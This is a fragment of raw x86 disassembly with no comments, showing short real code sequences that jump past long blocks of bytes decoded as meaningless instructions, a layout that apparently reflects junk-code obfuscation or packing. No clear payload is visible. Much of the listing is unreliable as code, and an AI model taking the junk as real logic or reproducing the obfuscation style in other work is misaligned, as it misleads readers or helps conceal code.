  40dd31:	ret    0x5ec0
  40dd34:	add    ah,BYTE PTR [edx+ebp*8]
  40dd37:	cmp    BYTE PTR [ecx+0x14],cl
  40dd3a:	dec    ecx
  40dd3b:	mov    ds:0xf495b67e,al
  40dd40:	pop    esi
  40dd41:	(bad)  
  40dd42:	pop    ebx
  40dd43:	in     eax,dx
  40dd44:	shr    DWORD PTR [edx-0x5d481825],1
  40dd4a:	ds clc 
  40dd4c:	loopne 0x40dd2a
  40dd4e:	or     ebx,DWORD PTR ds:0x5212d19f
  40dd54:	mov    BYTE PTR [ecx-0x6bac6f21],bl
  40dd5a:	push   ecx
  40dd5b:	scas   al,BYTE PTR es:[edi]
  40dd5c:	dec    esi
  40dd5d:	pop    edx
  40dd5e:	dec    esp
  40dd5f:	test   DWORD PTR [edi+edx*4],edx
  40dd62:	(bad)  
  40dd63:	push   edx
  40dd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd65:	mov    bh,0x38
  40dd67:	inc    edi
  40dd68:	jmp    0x40dd96
  40dd6a:	repz popa 
  40dd6c:	mulps  xmm3,XMMWORD PTR [ebx+0x568f6da9]
  40dd73:	sar    DWORD PTR [edx+0x5e],cl
  40dd76:	mov    DWORD PTR [ebp+edx*1-0x4a],esi
  40dd7a:	push   edi
  40dd7b:	inc    edi
  40dd7c:	in     al,dx
  40dd7d:	mov    esi,0x2a6c4d1f
  40dd82:	cli    
  40dd83:	popf   
  40dd84:	adc    ah,BYTE PTR [esi+0x73]
  40dd87:	adc    DWORD PTR [esi+eiz*4-0x3ae6803b],ebp
  40dd8e:	nop
  40dd8f:	retf   
  40dd90:	(bad)  
  40dd94:	pusha  
  40dd95:	les    ebx,FWORD PTR [esi+0x6c]
  40dd98:	sbb    BYTE PTR [edi-0x4e0f9634],ch
  40dd9e:	bound  ebp,QWORD PTR [edx-0x67]
  40dda1:	pop    ebp
  40dda2:	and    ch,bh
  40dda4:	sub    bh,BYTE PTR [ebx+0x6b]
  40dda7:	pop    ebx
  40dda8:	mov    dl,0xf3
  40ddaa:	cmp    eax,0xd3a3194d
  40ddaf:	or     dh,bl
  40ddb1:	dec    ebp
  40ddb2:	shl    DWORD PTR [ebx+ebx*4],0x83
  40ddb6:	aaa    
  40ddb7:	mov    cl,0x71
  40ddb9:	cdq    
  40ddba:	imul   edx,DWORD PTR [edi],0x6fe58136
  40ddc0:	fistp  QWORD PTR [ebp+eax*1+0x4db23117]
  40ddc7:	out    0x8f,al
  40ddc9:	outs   dx,DWORD PTR ds:[esi]
  40ddca:	and    DWORD PTR [eax],ecx
  40ddcc:	out    0x55,al
  40ddce:	call   0x3c382891
  40ddd3:	int3   
  40ddd4:	mov    edi,0x7a149b83
  40ddd9:	jnp    0x40dd6c
  40dddb:	int    0xd5
  40dddd:	not    ch
  40dddf:	fidivr DWORD PTR [ebp-0x5520c931]
  40dde5:	gs call 0xac83:0xcc2a8347
  40dded:	push   ds
  40ddee:	fwait
  40ddef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddf0:	pop    edx
  40ddf1:	pop    es
  40ddf2:	fcomp  QWORD PTR [ecx]
  40ddf4:	push   eax
  40ddf5:	scas   eax,DWORD PTR es:[edi]
  40ddf6:	imul   BYTE PTR [eax+0x61d88821]
  40ddfc:	and    DWORD PTR [edx+edx*2],eax
  40ddff:	or     al,0xe0
  40de01:	xchg   esp,eax
  40de02:	out    dx,al
  40de03:	inc    ebx
  40de04:	mov    ebx,0xbfd6ede8
  40de09:	and    al,0x7f
  40de0b:	jge    0x40ddb1
  40de0d:	and    BYTE PTR [edi],dl
  40de0f:	dec    edx
  40de10:	imul   eax,DWORD PTR [ebp+0x68],0xffffffcd
  40de14:	and    BYTE PTR [eax],ch
  40de16:	(bad)  
  40de18:	loope  0x40ddc5
  40de1a:	arpl   WORD PTR [ecx+ecx*2-0x72c1233f],bx
  40de21:	(bad)  [ebx]
  40de23:	imul   edi,DWORD PTR [edi-0x3bb7a429],0x47
  40de2a:	xor    al,0xcf
  40de2c:	jb     0x40de84
  40de2e:	test   eax,0x1e9d2c05
  40de33:	vmread DWORD PTR [edx-0x36a30299],ebp
  40de3a:	ror    DWORD PTR [edx-0x66cefb3f],cl
  40de40:	pop    ebp
  40de41:	push   0xfffffffc
  40de43:	jl     0x40de62
  40de45:	dec    esp
  40de46:	lods   al,BYTE PTR ds:[esi]
  40de47:	pop    esi
  40de48:	mov    al,0x77
  40de4a:	mov    ebx,0xba10b84f
  40de4f:	and    bh,BYTE PTR [edx]
  40de51:	jg     0x40ddd5
  40de53:	dec    ebx
  40de54:	out    dx,eax
  40de55:	popf   
  40de56:	mov    bl,0x27
  40de58:	mov    ds,WORD PTR [esp+esi*4-0x68]
  40de5c:	je     0x40de32
  40de5e:	nop
  40de5f:	and    esp,DWORD PTR [ebp+edx*8-0x10c6c25e]
  40de66:	push   es
  40de67:	(bad)  
  40de68:	mov    bh,0x69
  40de6a:	or     cl,BYTE PTR [ebp-0x52]
  40de6d:	jnp    0x40de48
  40de6f:	xor    edi,edx
  40de71:	fstp   DWORD PTR ds:0x73a19406
  40de77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de78:	not    BYTE PTR [esi-0x20]
  40de7b:	xchg   BYTE PTR [ecx+0x421f74e],bh
  40de81:	add    eax,0xa6735871
  40de86:	aam    0x35
  40de88:	or     ebx,DWORD PTR [edx]
  40de8a:	or     eax,0xa26985ed
  40de8f:	es je  0x40ded3
  40de92:	add    al,0x30
  40de94:	jnp    0x40dedd
  40de96:	test   al,0x6c
  40de98:	sub    eax,0x8c77be77
  40de9d:	xor    DWORD PTR [edx-0x4d48e85e],ebp
  40dea3:	sbb    eax,0x1354be3c
  40dea8:	call   FWORD PTR [edi+eax*8+0x524de845]
  40deaf:	add    BYTE PTR [eax],al
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x42226c
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	dec    esp
  40df1b:	mov    ch,BYTE PTR [esi-0x4103e931]
  40df21:	mov    esi,0xbebec299
  40df26:	push   ds
  40df27:	(bad)  
  40df28:	mov    cl,al
  40df2a:	nop
  40df2b:	retf   0x7377
  40df2e:	in     al,0xf5
  40df30:	mov    bh,0xcf
  40df32:	mov    DWORD PTR [ecx+0x77],eax
  40df35:	add    edx,ebp
  40df37:	call   esp
  40df39:	jb     0x40df92
  40df3b:	lds    edx,FWORD PTR es:[esi+0x32]
  40df3f:	scas   al,BYTE PTR es:[edi]
  40df40:	popf   
  40df41:	scas   al,BYTE PTR es:[edi]
  40df42:	mov    dh,0xf0
  40df44:	cmp    BYTE PTR [esi+eax*1],bh
  40df47:	pop    edi
  40df48:	mov    ebx,esp
  40df4a:	jmp    0x5c36:0x98f4a6f5
  40df51:	rcr    DWORD PTR [ecx+0x4a],0xb2
  40df55:	retf   0xd0d0
  40df58:	lds    edx,FWORD PTR [ebx-0x1aec0258]
  40df5e:	sub    cl,BYTE PTR [edx+0x331775d5]
  40df64:	cdq    
  40df65:	xor    BYTE PTR [edi-0x170d5ee5],bh
  40df6b:	(bad)  
  40df6c:	dec    eax
  40df6d:	mov    eax,ds:0x2b1ac1b7
  40df72:	ret    
  40df73:	mov    esi,0xd08d3b33
  40df78:	stos   DWORD PTR es:[edi],eax
  40df79:	inc    esp
  40df7a:	ds push ebp
  40df7c:	xchg   ebp,eax
  40df7d:	push   0x51
  40df7f:	shl    BYTE PTR [esi-0x1a],0x2a
  40df83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df84:	rcr    DWORD PTR [ebp+eiz*1-0x171e4e26],0xdf
  40df8c:	mov    ebx,0xcf731763
  40df91:	inc    ebp
  40df92:	push   ecx
  40df93:	daa    
  40df94:	pop    ecx
  40df95:	aam    0x46
  40df97:	test   DWORD PTR [edi],eax
  40df99:	dec    esp
  40df9a:	div    ebx
  40df9c:	icebp  
  40df9d:	cmp    eax,0xec1fdb2c
  40dfa2:	dec    esp
  40dfa3:	and    ah,cl
  40dfa5:	icebp  
  40dfa6:	fadd   DWORD PTR [edi]
  40dfa8:	push   0x55
  40dfaa:	loope  0x40df88
  40dfac:	or     edx,edi
  40dfae:	out    0xbe,al
  40dfb0:	cmp    eax,0x3b25464f
  40dfb6:	mov    ecx,0x1c118341
  40dfbb:	stos   BYTE PTR es:[edi],al
  40dfbc:	int    0x59
  40dfbe:	adc    eax,0x5305599e
  40dfc3:	jne    0x40dfba
  40dfc5:	xchg   ebp,eax
  40dfc6:	sbb    DWORD PTR [ebx+edx*4],edx
  40dfc9:	xor    edi,DWORD PTR [ecx]
  40dfcb:	lock sub BYTE PTR [esi+0x51],al
  40dfcf:	cmp    DWORD PTR [edi+0x39168d4a],esp
  40dfd5:	loopne 0x40dfa3
  40dfd7:	jmp    0x9322:0x436b335d
  40dfde:	pop    ss
  40dfdf:	clc    
  40dfe0:	outs   dx,DWORD PTR ds:[esi]
  40dfe1:	fmul   st(1),st
  40dfe3:	(bad)  
  40dfe4:	lock out 0x39,al
  40dfe7:	test   eax,0xea54ea67
  40dfec:	jne    0x40e01f
  40dfee:	in     eax,0xd0
  40dff0:	mov    bl,bl
  40dff2:	into   
  40dff3:	push   ss
  40dff4:	adc    cl,BYTE PTR [ebx+esi*1+0x74]
  40dff8:	test   eax,0x19d9668c
  40dffd:	iret   
  40dffe:	push   0xffffff87
  40e000:	loop   0x40df98
  40e002:	hlt    
  40e003:	pop    es
  40e004:	test   ecx,esi
  40e006:	addr16 hlt 
  40e008:	mov    edx,0x1c8a074c
  40e00d:	mov    edi,0x4ac74994
  40e012:	mov    WORD PTR [eax],gs
  40e014:	inc    esi
  40e015:	pop    ebx
  40e016:	dec    esi
  40e017:	xor    al,0x3f
  40e01a:	jae    0x40e064
  40e01c:	mul    esi
  40e01e:	aam    0xa0
  40e020:	fstp   DWORD PTR [ecx-0x57]
  40e023:	sbb    eax,0x97750163
  40e028:	stc    
  40e029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e02a:	xchg   esi,eax
  40e02b:	aad    0xfe
  40e02d:	mov    ds:0x6145ee8f,al
  40e032:	out    dx,al
  40e033:	xor    al,0xb5
  40e035:	jne    0x40e01c
  40e037:	pop    edx
  40e038:	cmp    BYTE PTR [eax+0x6acdad36],dl
  40e03e:	jg     0x40e087
  40e040:	mov    WORD PTR [esi],es
  40e042:	push   ecx
  40e043:	jbe    0x40dfd0
  40e045:	dec    ebp
  40e046:	popf   
  40e047:	sub    ebp,DWORD PTR [edi-0x11]
  40e04a:	mov    edi,0xd78e3aa4
  40e04f:	sbb    BYTE PTR [edi],0xb8
  40e052:	or     al,0x1c
  40e054:	jl     0x40e06d
  40e056:	mov    ebp,0xac1a670e
  40e05b:	push   esi
  40e05c:	(bad)  
  40e05d:	loop   0x40dfec
  40e05f:	cmc    
  40e060:	iret   
  40e061:	imul   ecx,DWORD PTR [ebp-0xabe9f43],0xffffff9d
  40e068:	daa    
  40e069:	jno    0x40e039
  40e06b:	mov    ds:0x7adc9a94,eax
  40e070:	xchg   ecx,eax
  40e071:	bound  eax,QWORD PTR ds:0x22c3c458
  40e077:	out    dx,eax
  40e078:	cmc    
  40e079:	into   
  40e07a:	inc    ebp
  40e07c:	sub    bl,BYTE PTR [ebp+0x7bbc9229]
  40e082:	cdq    
  40e083:	sub    al,0xbd
  40e085:	daa    
  40e086:	test   al,0x52
  40e088:	pusha  
  40e089:	xchg   esi,eax
  40e08a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e08b:	inc    ebp
  40e08c:	ror    DWORD PTR [esi+0x60f0f0b7],0xd1
  40e093:	inc    eax
  40e094:	or     eax,edx
  40e096:	jne    0x40e06d
  40e098:	cmp    ah,BYTE PTR [eax+0x37]
  40e09b:	imul   dh
  40e09d:	pop    ecx
  40e09e:	daa    
  40e09f:	ret    
  40e0a0:	fidiv  DWORD PTR [edi-0x1234b09]
  40e0a6:	push   eax
  40e0a7:	ficom  WORD PTR [edx+0x218ba58b]
  40e0ad:	inc    edx
  40e0ae:	or     esp,DWORD PTR [ebp+0x4154df25]
  40e0b4:	add    BYTE PTR [eax],dl
  40e0b6:	and    al,0x8c
  40e0b8:	ficomp DWORD PTR [ecx+esi*2]
  40e0bb:	cmp    eax,DWORD PTR [eax-0x6f]
  40e0be:	es jge 0x40e0a3
  40e0c1:	adc    BYTE PTR [edi+0x1b],al
  40e0c4:	int3   
  40e0c5:	mov    ebp,0x5cc65434
  40e0ca:	les    eax,FWORD PTR [ebp-0x694952b]
  40e0d0:	out    dx,al
  40e0d1:	hlt    
  40e0d2:	push   ss
  40e0d3:	loop   0x40e0d8
  40e0d5:	inc    esp
  40e0d6:	xchg   ecx,eax
  40e0d7:	lahf   
  40e0d8:	push   ebp
  40e0d9:	out    dx,eax
  40e0da:	rcl    DWORD PTR [esi+0x5f0288e7],1
  40e0e0:	mov    ecx,0x5d797088
  40e0e5:	mov    ebx,0xbcaa76c6
  40e0ea:	aaa    
  40e0eb:	mov    al,0x33
  40e0ed:	adc    al,0xdc
  40e0ef:	or     dh,BYTE PTR [eax-0x20]
  40e0f2:	or     esp,DWORD PTR [eax]
  40e0f4:	jmp    edx
  40e0f6:	xor    BYTE PTR es:0x554a829b,dl
  40e0fd:	mov    ds:0xa9cc7595,eax
  40e102:	jae    0x40e11e
  40e104:	nop
  40e105:	setns  BYTE PTR [edx+0x6004e6df]
  40e10c:	aad    0x83
  40e10e:	xor    ecx,DWORD PTR [ebx-0x5aaa6b43]
  40e114:	test   eax,0x9812d24c
  40e119:	(bad)  
  40e11b:	xchg   esp,eax
  40e11c:	and    DWORD PTR [edx-0x23ad2861],edi
  40e122:	std    
  40e123:	aam    0x63
  40e125:	fist   DWORD PTR [edi-0x570e289d]
  40e12b:	sub    bl,al
  40e12d:	pop    ebp
  40e12e:	ja     0x40e177
  40e130:	or     BYTE PTR [ecx],0x4c
  40e133:	adc    eax,0x8f2e1f99
  40e138:	mov    al,ds:0x786a3c52
  40e13d:	cld    
  40e13e:	or     al,0x70
  40e140:	and    cl,bl
  40e142:	mov    eax,0xd7fecae2
  40e147:	cmp    edi,edi
  40e149:	xlat   BYTE PTR ds:[ebx]
  40e14a:	(bad)  
  40e14b:	pop    eax
  40e14c:	or     al,0xb9
  40e14e:	add    ah,BYTE PTR [edi+0x1dc445e9]
  40e154:	dec    esi
  40e155:	mov    ebx,0xb88c5c2f
  40e15a:	mov    ch,0x1d
  40e15c:	pop    es
  40e15d:	xchg   ebx,eax
  40e15e:	out    0xda,al
  40e160:	mov    cl,0xdc
  40e162:	mov    ebx,0xc1827883
  40e167:	pop    eax
  40e168:	lock sub DWORD PTR [edx-0x799ca246],esp
  40e16f:	pop    ss
  40e170:	clc    
  40e171:	stc    
  40e172:	cmp    ebx,DWORD PTR [ecx+0x1e]
  40e175:	rcr    BYTE PTR [edx-0x17b6efc3],1
  40e17b:	fistp  DWORD PTR [edi+0x6799521]
  40e181:	sub    eax,0x4dd484b9
  40e186:	loop   0x40e122
  40e188:	pop    esi
  40e189:	mov    ecx,0x314e0078
  40e18e:	mov    WORD PTR [eax-0x6c],ds
  40e191:	sar    BYTE PTR [eax+0x477d66bd],cl
  40e197:	pop    ebp
  40e198:	mov    DWORD PTR [esi],eax
  40e19a:	mov    DWORD PTR [ebp-0x20],0x3354
  40e1a1:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  40e1a8:	mov    DWORD PTR [ebp-0x18],0x3d36
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	xlat   BYTE PTR ds:[ebx]
  40e1d6:	pop    ss
  40e1d7:	rcl    DWORD PTR [eax-0x4141fd0f],1
  40e1dd:	cdq    
  40e1de:	ret    0xbebe
  40e1e1:	lock nop esp
  40e1e5:	fnstcw WORD PTR [esi]
  40e1e7:	(bad)  
  40e1e8:	adc    ah,BYTE PTR [ecx+esi*1-0x6d65a087]
  40e1ef:	ret    
  40e1f0:	fbld   TBYTE PTR [ebx+0x1c37ce06]
  40e1f6:	fs retf 0xc636
  40e1fa:	stos   BYTE PTR es:[edi],al
  40e1fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1fc:	js     0x40e21e
  40e1fe:	push   edi
  40e1ff:	add    al,0x14
  40e201:	sub    eax,0x50d16180
  40e206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e207:	ror    DWORD PTR fs:0x3fa90cd1,0x3d
  40e20f:	ret    0xd129
  40e212:	mov    ecx,0x2edb7344
  40e217:	inc    eax
  40e218:	mov    ch,0xbf
  40e21a:	push   esi
  40e21b:	push   edx
  40e21c:	int3   
  40e21d:	in     al,dx
  40e21e:	sub    edi,DWORD PTR [eax-0x2133807f]
  40e224:	pop    esi
  40e225:	pushf  
  40e226:	xchg   esi,eax
  40e227:	mov    esi,0x93314b15
  40e22c:	ret    0xb464
  40e22f:	dec    ebp
  40e230:	mov    al,0x23
  40e232:	sahf   
  40e233:	das    
  40e234:	add    dl,BYTE PTR [edi-0x7202f63e]
  40e23a:	or     al,0x9e
  40e23c:	add    DWORD PTR [edi-0x3d2207e5],0x11
  40e243:	push   cs
  40e244:	jmp    0x40e202
  40e246:	and    eax,0xb782c0b9
  40e24b:	lods   eax,DWORD PTR ds:[esi]
  40e24c:	pop    edx
  40e24d:	and    esi,DWORD PTR [edi]
  40e24f:	ror    DWORD PTR [ebx-0x7],cl
  40e252:	mov    al,ds:0xe9d403f5
  40e257:	xchg   ebp,eax
  40e258:	or     BYTE PTR ds:0x803a7b50,dl
  40e25e:	stc    
  40e25f:	lods   eax,DWORD PTR ds:[esi]
  40e260:	outs   dx,BYTE PTR ds:[esi]
  40e261:	add    al,0x5a
  40e263:	test   BYTE PTR [edx],bl
  40e265:	sbb    DWORD PTR [ebx],esp
  40e267:	mov    esp,0x113b8a76
  40e26c:	or     al,0x3f
  40e26e:	inc    edx
  40e26f:	stc    
  40e270:	scas   al,BYTE PTR es:[edi]
  40e271:	mov    ds:0x50045ae5,al
  40e276:	(bad)  
  40e27a:	xor    al,0xbb
  40e27c:	xor    eax,0xa3c4db24
  40e281:	xchg   esp,eax
  40e282:	cmp    esi,DWORD PTR [bp+si]
  40e285:	cld    
  40e286:	xchg   esp,eax
  40e287:	inc    edi
  40e288:	mov    eax,ds:0x42f1d291
  40e28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e28e:	jmp    0x7fde:0x5a17964d
  40e295:	(bad)  
  40e296:	mov    es,WORD PTR [esi]
  40e298:	push   ecx
  40e299:	test   al,0x82
  40e29b:	leave  
  40e29c:	mov    dl,cl
  40e29e:	mov    ebx,0x8ba17acc
  40e2a3:	int    0x3c
  40e2a5:	mov    WORD PTR [edi+eiz*2],fs
  40e2a8:	add    esp,ebp
  40e2aa:	adc    cl,BYTE PTR [edx+0x72]
  40e2ad:	mov    bl,0x85
  40e2af:	mov    ch,0x7c
  40e2b1:	test   bh,0x23
  40e2b4:	jmp    0x32677540
  40e2b9:	cdq    
  40e2ba:	fmulp  st(5),st
  40e2bc:	inc    esp
  40e2bd:	mov    esi,ds
  40e2bf:	mov    ds:0x9cc46422,eax
  40e2c4:	inc    ebp
  40e2c5:	stos   BYTE PTR es:[edi],al
  40e2c6:	outs   dx,DWORD PTR ds:[esi]
  40e2c7:	pop    ecx
  40e2c8:	sub    al,bl
  40e2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2cb:	jecxz  0x40e2b9
  40e2cd:	pop    esp
  40e2ce:	xchg   ecx,eax
  40e2cf:	outs   dx,DWORD PTR ds:[esi]
  40e2d0:	or     DWORD PTR [eax+esi*8-0x31ed75a6],eax
  40e2d7:	mov    al,0x2d
  40e2d9:	mov    ebx,0x3fc28cdf
  40e2de:	pop    ds
  40e2df:	mov    edi,?
  40e2e1:	jmp    0xdfa2:0x239bc15b
  40e2e8:	sbb    ebp,DWORD PTR [edx+0x3f]
  40e2eb:	cld    
  40e2ec:	mov    dh,0x4a
  40e2ee:	xor    al,0xa4
  40e2f0:	cdq    
  40e2f1:	add    dh,al
  40e2f3:	sbb    BYTE PTR [esi+esi*8-0x4b],bl
  40e2f7:	imul   ebx,DWORD PTR [ebx+0x79],0xffffffab
  40e2fb:	mov    cl,0xd3
  40e2fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2fe:	mov    eax,0x6e16db31
  40e303:	fisubr DWORD PTR [ecx+0x448ba6f1]
  40e309:	cmp    bh,BYTE PTR [edx-0x63cb2cb4]
  40e30f:	ins    BYTE PTR es:[edi],dx
  40e310:	jecxz  0x40e37d
  40e312:	add    ecx,DWORD PTR [ebx+0x1d]
  40e315:	cld    
  40e316:	mov    ds,WORD PTR [ecx-0x4b9543c9]
  40e31c:	not    BYTE PTR [ecx-0x12]
  40e31f:	inc    edx
  40e320:	sbb    al,0xac
  40e322:	jl     0x40e37a
  40e324:	je     0x40e367
  40e326:	push   eax
  40e327:	test   al,0xda
  40e329:	cmp    ebp,DWORD PTR [esi+edi*2-0x6d]
  40e32d:	dec    ebp
  40e32e:	ins    DWORD PTR es:[edi],dx
  40e32f:	out    0xc2,al
  40e331:	clc    
  40e332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e333:	or     edi,DWORD PTR [edx+0x5cfef271]
  40e339:	jns    0x40e354
  40e33b:	mov    ch,BYTE PTR [ebp+0x339d8c3b]
  40e341:	les    esp,FWORD PTR [edx+0x38f14a4f]
  40e347:	and    DWORD PTR [edi-0x7a],edx
  40e34a:	dec    ebx
  40e34b:	leave  
  40e34c:	test   BYTE PTR [eax+0x3c],dh
  40e34f:	sub    dl,BYTE PTR [ecx+0x2caad47f]
  40e355:	xchg   BYTE PTR [esi+eiz*2-0x74],bh
  40e359:	jbe    0x40e2f5
  40e35b:	pusha  
  40e35c:	arpl   dx,bp
  40e35e:	mov    ds:0xd884d75d,eax
  40e363:	cmp    BYTE PTR [eax],al
  40e365:	sbb    DWORD PTR [edi+0x18e0e440],ebp
  40e36b:	call   0xbe94b3a8
  40e370:	shl    DWORD PTR [ecx],cl
  40e372:	div    DWORD PTR [ecx]
  40e374:	fadd   st,st(1)
  40e376:	jp     0x40e3e9
  40e378:	pop    eax
  40e379:	adc    DWORD PTR [edi+eiz*1],esp
  40e37c:	int3   
  40e37d:	push   ecx
  40e37e:	dec    ebx
  40e37f:	or     BYTE PTR [ebx+0x65],dh
  40e382:	sub    BYTE PTR [esi+0x60af0aae],ch
  40e388:	add    eax,0xe66ff5ea
  40e38d:	jb     0x40e340
  40e38f:	adc    eax,0xcb5922b6
  40e394:	pop    edi
  40e395:	jnp    0x40e394
  40e397:	dec    edi
  40e398:	test   eax,0x4ddb3b0b
  40e39d:	jle    0x40e33c
  40e39f:	jle    0x40e3ec
  40e3a1:	(bad)  
  40e3a2:	mov    BYTE PTR [eax],cl
  40e3a4:	push   cs
  40e3a5:	cmp    DWORD PTR [esi],ebp
  40e3a7:	jmp    0x40e384
  40e3a9:	out    0x7a,al
  40e3ab:	adc    BYTE PTR [ebx+0x79ffe063],bh
  40e3b1:	pop    es
  40e3b2:	shr    dl,cl
  40e3b4:	xor    DWORD PTR [ebx+0x9],0x27
  40e3b8:	sub    dl,dl
  40e3ba:	sbb    ebx,edx
  40e3bc:	and    al,0x7e
  40e3be:	neg    BYTE PTR [eax+ebp*2+0x71ffc6cc]
  40e3c5:	mov    ah,0x2f
  40e3c7:	jg     0x40e39d
  40e3c9:	in     eax,dx
  40e3ca:	or     eax,0xc4e988ee
  40e3cf:	jno    0x40e38c
  40e3d1:	push   es
  40e3d2:	loopne 0x40e392
  40e3d4:	imul   esi,DWORD PTR fs:[eax],0xe7a20270
  40e3db:	fdiv   DWORD PTR [ecx]
  40e3dd:	call   0x9090:0xb963a1d4
  40e3e4:	int    0x2
  40e3e6:	mov    eax,0x78ec2e39
  40e3eb:	into   
  40e3ec:	retf   0xa63f
  40e3ef:	into   
  40e3f0:	mov    ecx,0x2e55313b
  40e3f5:	rol    DWORD PTR ds:0x61ff0994,1
  40e3fb:	lea    edx,[ebx+0x34781f51]
  40e401:	dec    edx
  40e402:	call   0xd7b5ba57
  40e407:	push   edi
  40e408:	sbb    al,0x29
  40e40a:	fisubr DWORD PTR [ebp-0x46]
  40e40d:	push   es
  40e40e:	mov    BYTE PTR [ecx],ah
  40e410:	loop   0x40e3e1
  40e412:	fisubr DWORD PTR [eax]
  40e414:	daa    
  40e415:	mov    BYTE PTR [ebp-0x6b83854c],ch
  40e41b:	add    eax,0xb0033c94
  40e420:	cmp    ecx,DWORD PTR [ebx-0x80]
  40e423:	push   0xf452ed64
  40e428:	mov    ecx,0xd756e01e
  40e42d:	mov    edx,0xf3e9261f
  40e432:	jl     0x40e441
  40e434:	outs   dx,BYTE PTR ds:[esi]
  40e435:	ja     0x40e474
  40e437:	fsincos 
  40e439:	adc    al,0xe5
  40e43b:	xchg   ebx,eax
  40e43c:	adc    ch,dl
  40e43e:	pop    esp
  40e43f:	jecxz  0x40e3cb
  40e441:	lods   al,BYTE PTR ds:[esi]
  40e442:	inc    ecx
  40e443:	loop   0x40e3fe
  40e445:	loopne 0x40e454
  40e447:	call   0x2a629532
  40e44c:	xchg   DWORD PTR [ecx+0x69ce1808],esp
  40e452:	std    
  40e453:	inc    edi
  40e454:	mov    DWORD PTR [ebp-0x4],edi
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x42226c
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
